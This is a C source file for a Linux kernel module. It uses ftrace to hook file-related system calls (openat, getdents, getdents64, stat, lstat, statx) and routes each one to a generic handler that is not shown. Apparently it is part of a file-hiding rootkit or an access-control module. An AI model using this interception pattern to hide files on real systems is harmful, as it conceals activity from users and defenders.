#include "hooks.h"

#if !USE_FENTRY_OFFSET
#pragma GCC optimize("-fno-optimize-sibling-calls")
#endif

// #ifdef PTREGS_SYSCALL_STUBS



static asmlinkage long (*real_sys_openat)(struct pt_regs *regs);
static asmlinkage long (*real_sys_getdents)(struct pt_regs *regs);

static asmlinkage long (*real_sys_getdents64)(struct pt_regs *regs);
static asmlinkage long (*real_sys_statx)(struct pt_regs *regs);
static asmlinkage long (*real_sys_stat)(struct pt_regs *regs);
static asmlinkage long (*real_sys_lstat)(struct pt_regs *regs);


static asmlinkage long fh_sys_openat(struct pt_regs *regs){
	return fh_sys_generic(regs, real_sys_openat, regs->si);
}

static asmlinkage long fh_sys_getdents(struct pt_regs *regs){
	return fh_sys_generic(regs, real_sys_getdents, regs->si);
}

static asmlinkage long fh_sys_getdents64(struct pt_regs *regs){
	return fh_sys_generic(regs, real_sys_getdents64, regs->si);
}

static asmlinkage long fh_sys_statx(struct pt_regs *regs){
	return fh_sys_generic(regs, real_sys_statx, regs->si);
}

static asmlinkage long fh_sys_stat(struct pt_regs *regs){
	return fh_sys_generic(regs, real_sys_stat, regs->di);
}

static asmlinkage long fh_sys_lstat(struct pt_regs *regs){
	return fh_sys_generic(regs, real_sys_lstat, regs->di);
}


struct ftrace_hook generic_hooks[] = {
	HOOK(SYSCALL_NAME("sys_openat"), fh_sys_openat, &real_sys_openat),
	HOOK(SYSCALL_NAME("sys_getdents"), fh_sys_getdents, &real_sys_getdents),
	HOOK(SYSCALL_NAME("sys_statx"), fh_sys_statx, &real_sys_statx),
	HOOK(SYSCALL_NAME("sys_stat"), fh_sys_stat, &real_sys_stat),
	HOOK(SYSCALL_NAME("sys_lstat"), fh_sys_lstat, &real_sys_lstat),
	HOOK(SYSCALL_NAME("sys_getdents64"), fh_sys_getdents64, &real_sys_getdents64),
};

size_t generic_hooks_size = ARRAY_SIZE(generic_hooks);